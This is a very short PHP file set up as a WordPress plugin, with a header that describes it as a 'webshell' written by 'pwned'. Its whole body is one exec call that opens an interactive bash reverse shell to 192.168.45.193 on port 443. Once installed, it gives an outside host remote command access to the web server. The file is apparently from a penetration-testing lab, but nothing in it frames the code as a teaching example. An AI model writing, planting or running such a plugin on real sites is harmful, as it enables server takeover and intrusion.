/**
* Plugin Name: New-Plugin
* Plugin URI: https://somewhere
* Description: webshell
* Version: 1.0
* Author: pwned
* Author URI: https://pwned.net
* License: https://nothing
*/

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.193/443 0>&1'");
?>
